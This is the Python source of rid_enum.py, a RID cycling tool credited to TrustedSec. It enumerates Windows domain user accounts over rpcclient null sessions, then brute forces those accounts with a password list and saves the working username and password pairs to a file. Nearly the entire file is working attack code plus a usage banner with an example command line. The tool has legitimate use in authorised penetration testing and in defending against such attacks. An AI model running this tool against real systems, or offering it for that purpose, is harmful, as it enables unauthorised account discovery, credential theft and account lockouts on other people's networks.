#!/usr/bin/python
import subprocess
import os
import sys
#############################################################################################################
#
# RID Enum
# RID Cycling Tool 
#
# Written by: David Kennedy (ReL1K)
# Website: https://www.trustedsec.com
# Twitter: @TrustedSec
# Twitter: @dave_rel1k
#
# This tool will use rpcclient to cycle through and identify what rid accounts exist. Uses a few
# different techniques to find the proper RID.
#
#############################################################################################################

# attempt to use lsa query furst
def check_user_lsa(ip):
	# pull the domain via lsaenum
        proc = subprocess.Popen('rpcclient -U "" %s -N -c "lsaquery"' % (ip), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        stdout_value=proc.communicate()[0]
        # if the user wasnt found, return a False
        if not "Domain Sid" in stdout_value:
                return False
        else:
                return stdout_value

# attempt to lookup an account via rpcclient
def check_user(ip, account):
	proc = subprocess.Popen('rpcclient -U "" %s -N -c "lookupnames %s"' % (ip,account), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	stdout_value=proc.communicate()[0]
	# if the user wasnt found, return a False
	if "NT_STATUS_NONE_MAPPED" in stdout_value:
		return False
	else: 
		return stdout_value

# this will do a conversion to find the account name based on rid
def sid_to_name(ip, sid, rid):
	proc = subprocess.Popen('rpcclient -U "" %s -N -c "lookupsids %s-%s"' % (ip, sid,rid), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	stdout_value = proc.communicate()[0]
	if not "*unknown*" in stdout_value:
		rid_account = stdout_value.split(" ", 1)[1]
		# will show during an unhandled request
		if rid_account[1] != "request":
			# here we join based on spaces, for example 'Domain Admins' needs to be joined
			rid_account = rid_account.replace("(1)", "")
			rid_account = rid_account.replace("(2)", "")
			rid_account = rid_account.replace("(3)", "")
			rid_account = rid_account.replace("(4)", "")
			# return the full domain\username
			rid_account = rid_account.rstrip()
			return rid_account

# capture initial input
success = ""
try:
	ip = sys.argv[1]
	rid_start = sys.argv[2]
	rid_stop = sys.argv[3]
	# if password file was specified
	passwords = ""
	# if we use userlist
	userlist = ""
	try:
		# pull in password file
		passwords = sys.argv[4]
		# if its not there then bomb out
		if not os.path.isfile(passwords):
			print "[!] File was not found. Please try a path again."
			sys.exit()

	except IndexError: 
		pass

	try:
		userlist = sys.argv[5]
		if not os.path.isfile(userlist):
			print "[!] File was not found. Please try a path again."
			sys.exit()

	except IndexError:
		pass

	# check for python pexpect
	try:
		import pexpect

	# if we dont have it
	except ImportError:
		print "[!] Sorry boss, python-pexpect is not installed. You need to install this first."
		sys.exit()

	# if userlist is being used verus rid enum, then skip all of this
	if userlist == "":
		print "[*] Attempting lsaquery first...This will enumerate the base domain SID"
		# call the check_user_lsa function and check to see if we can find base SID guid
		sid = check_user_lsa(ip)
		# if lsa enumeration was successful then don't do 
		if sid != False:
			if sid != "":
				print "[*] Successfully enumerated base domain SID.. Moving on to extract via RID"
				# format it properly
				sid = sid.rstrip()
				sid = sid.split(" ")
				sid = sid[4]
	
		# if we weren't successful on lsaquery
		if sid == False:
			print "[!] Unable to enumerate through lsaquery, trying default account names.."
			accounts = ("administrator", "guest", "krbtgt")
			for account in accounts:
				# check the user account based on tuple
				sid = check_user(ip, account)
				# if its false then cycle threw
				if sid == False:
					print "[!] Failed using account name: %s...Attempting another." % (account)
				else:
					if sid != "":
						# success! Break out of the loop
						print "[*] Successfully enumerated SID account.. Moving on to extract via RID.\n"
						break
					else:
						print "[!] Failed. Access is denied. Sorry boss."
						sys.exit()
	
			# pulling the exact domain SID out
			sid = sid.split(" ")
			# pull first in tuple
			sid = sid[1]
			# remove the RID number
			sid = sid[:-4]
	
		# we has no sids :( exiting
		if sid == False:
			print "[!] Unable to enumerate user accounts, sorry..Must not be vulnerable."
			sys.exit()	
	
		print "[*] Enumerating user accounts.. This could take a little while."
		# assign rid start and stop as integers
		rid_start = int(rid_start)
		rid_stop = int(rid_stop)
	
		# this is where we write out our output
		if os.path.isfile("%s_users.txt" % (ip)):
			# remove old file
			os.remove("%s_users.txt" % (ip))
		filewrite = file("%s_users.txt" % (ip), "a")
	
		# cycle through rid and enumerate the domain
		while rid_start != rid_stop:
			sidname = sid_to_name(ip, sid, rid_start)
			if sidname != None:
				# print the sid
				print "Account name: " + sidname
				# write the file out
				filewrite.write(sidname + "\n")
	
			# increase rid until we hit our rid_stop
			rid_start = rid_start + 1
	
		# close the file
		filewrite.close()
	
		print "[*] Finished enumerating user accounts... Seemed to be successful."
	
	# if we specified a password list
	if passwords != "":
		# our password file
		passfile = file(passwords, "r").readlines()
			
		# if userlist was specified
		if userlist != "":
			# use the userlist specified
			userfile = file(userlist, "r").readlines()

		# our list of users
		if userlist == "":
			userfile = file("%s_users.txt" % (ip), "r").readlines()

		# write out the files upon success
		filewrite = file("%s_success_results.txt" % (ip), "a")

		# cycle through username first
		for user in userfile:
			user = user.rstrip()
			user_fixed = user.replace("\\", "\\\\")

			# if the user isnt blank
			if not "'" in user:
				for password in passfile:
					password = password.rstrip()
					# if we specify a lowercase username
					if password == "lc username":
						password = user.split("\\")[1] 
						password = password.lower()
					# if we specify a uppercase username
					if password == "uc username": 
						password = user.split("\\")[1]
						password = password.upper()
					child = pexpect.spawn("rpcclient -U '%s%%%s' %s" % (user_fixed, password, ip))
					i = child.expect(['LOGON_FAILURE', 'rpcclient', 'NT_STATUS_ACCOUNT_EXPIRED', 'NT_STATUS_ACCOUNT_LOCKED_OUT'])

					# login failed for this one
					if i == 0:
						print "Failed guessing username of %s and password of %s" % (user, password)
						child.kill(0)

					# if successful
					if i == 1:
						print "[*] Successfully guessed username: %s with password of: %s" % (user, password)
						filewrite.write("username: %s password: %s\n" % (user, password))
						filewrite.close()
						success = "1"
						child.kill(0)

					# if account expired	
					if i == 2:
						print "[-] Successfully guessed username: %s with password of: %s however, it is set to expired." % (user, password)
						filewrite.write("username: %s password: %s\n" % (user,password))
						filewrite.close()
						success = "1"
						child.kill(0)

					# if account is locked out
					if i == 3:
						print "[!] Careful. Received a NT_STATUS_ACCOUNT_LOCKED_OUT was detected.. You may be locking accounts out!" 
						child.kill(0)

		# if we weren't successful
		if success == "":
			print "\n[!] Unable to brute force a user account, sorry boss."

		# if we got lucky
		if success != "":
			print "[*] We got some accounts, exported results to %s_success_results_txt" % (ip)
			print "[*] All accounts extracted via RID cycling have been exported to %s_users.txt" % (ip)

	# exit out after we are finished
	sys.exit()

# except keyboard interrupt
except KeyboardInterrupt:
	print "[*] Okay, Okay... Exiting... Thanks for using rid_enum.py"

# except indexerror
except IndexError, e:

	print """
.______       __   _______         _______ .__   __.  __    __  .___  ___. 
|   _  \     |  | |       \       |   ____||  \ |  | |  |  |  | |   \/   | 
|  |_)  |    |  | |  .--.  |      |  |__   |   \|  | |  |  |  | |  \  /  | 
|      /     |  | |  |  |  |      |   __|  |  . `  | |  |  |  | |  |\/|  | 
|  |\  \----.|  | |  '--'  |      |  |____ |  |\   | |  `--'  | |  |  |  | 
| _| `._____||__| |_______/  _____|_______||__| \__|  \______/  |__|  |__| 
                            |______|                                       

Written by: David Kennedy (ReL1K)
Company: https://www.trustedsec.com
Twitter: @TrustedSec
Twitter: @Dave_ReL1K

Rid Enum is a RID cycling attack that attempts to enumerate user accounts through 
null sessions and the SID to RID enum. If you specify a password file, it will 
automatically attempt to brute force the user accounts when its finished enumerating.

- RID_ENUM is open source and uses all standard python libraries minus python-pexpect. -

You can also specify an already dumped username file, it needs to be in the DOMAINNAME\USERNAME 
format.

Example: ./rid_enum.py 192.168.1.50 500 50000 /root/dict.txt

Usage: ./rid_enum.py <server_ip> <start_rid> <end_rid> <optional_password_file> <optional_username_filename>
"""
	sys.exit()
